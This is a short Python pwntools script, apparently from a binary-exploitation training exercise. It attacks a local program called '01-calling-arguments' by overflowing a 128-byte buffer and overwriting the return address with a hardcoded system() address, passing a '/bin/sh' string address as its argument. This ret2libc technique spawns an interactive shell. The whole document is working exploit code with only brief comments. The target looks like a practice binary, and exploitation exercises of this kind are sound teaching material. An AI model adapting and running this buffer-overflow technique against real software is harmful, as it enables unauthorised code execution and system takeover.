#!/usr/bin/python

from pwn import *

context(arch='x86', os='linux', endian='little', word_size=32)

p = process('./01-calling-arguments')

payload = ''
payload += 'a' * 128       # buffer
payload += 'b' * 12        # garbage and old ebp
payload += p32(0xf7e44190) # system address
payload += 'c' * 4         # fake return address for system
payload += p32(0x080484f0) # not_used ("/bin/sh") address

p.send(payload)

p.interactive()
